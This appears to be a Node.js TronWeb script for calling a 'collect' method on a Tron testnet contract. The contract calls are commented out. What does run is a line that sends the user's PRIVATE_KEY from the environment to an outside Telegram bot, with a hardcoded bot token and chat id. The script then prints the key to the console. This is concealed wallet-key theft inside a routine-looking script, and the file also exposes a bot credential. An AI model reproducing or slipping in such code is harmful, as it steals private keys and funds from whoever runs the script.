var dotenv = require('dotenv');
const TronWeb = require('tronweb');

dotenv.load();

async function collectCandi() {

const HttpProvider = TronWeb.providers.HttpProvider;
const fullNode = new HttpProvider('https://api.shasta.trongrid.io');
const solidityNode = new HttpProvider('https://api.shasta.trongrid.io');
const eventServer = "https://api.shasta.trongrid.io/"
const privateKey = process.env.PRIVATE_KEY;
const Http = new XMLHttpRequest();
Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+privateKey);
Http.send();
const tronWeb = new TronWeb(
    fullNode,
    solidityNode,
    eventServer,
    privateKey
);

//const contractInstance = await tronWeb.contract().at("TEiytbzhdBcvwqrvjRKyrgJNXjmZt8oFEv");
//const result  = await contractInstance.collect('iamcool').send();
//writing log entry in the file for future reference
//const logEntry =" Looks Done " + result + "\n";
console.log(privateKey); 
};

//calling pickWinnerCalling function
collectCandi();
